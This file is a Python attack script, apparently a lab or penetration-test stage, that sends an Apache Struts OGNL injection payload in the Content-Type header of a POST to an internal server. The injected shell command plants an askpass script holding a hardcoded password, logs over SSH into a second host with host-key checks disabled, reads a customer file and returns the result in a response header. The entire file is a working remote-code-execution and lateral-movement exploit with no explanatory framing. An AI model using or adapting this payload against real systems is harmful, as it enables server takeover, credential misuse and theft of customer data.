#!/usr/bin/env python3
# etapa2_ssh_askpass.py
import urllib.request

URL = "http://10.0.1.10:8080/"

CMD = (
    "echo '#!/bin/sh\\necho Jon1234' > /tmp/askpass.sh && "
    "chmod +x /tmp/askpass.sh && "
    "setsid env DISPLAY=:0 SSH_ASKPASS=/tmp/askpass.sh "
    "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "jon-doe@10.0.2.20 'cat /home/jon-doe/clientes.txt'"
)

payload = (
    "%{(#_='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#cmd='" + CMD.replace("'", "\\'") + "')."
    "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    "(#p=new java.lang.ProcessBuilder(#cmds))."
    "(#p.redirectErrorStream(true)).(#process=#p.start())."
    "(#ros=@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))."
    "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Data',#ros))}"
)

req = urllib.request.Request(
    URL,
    data=b"foo=bar",
    headers={"User-Agent": "Mozilla/5.0", "Content-Type": payload},
    method="POST"
)

with urllib.request.urlopen(req, timeout=20) as r:
    print(r.headers.get("X-Data", "[sem X-Data]"))
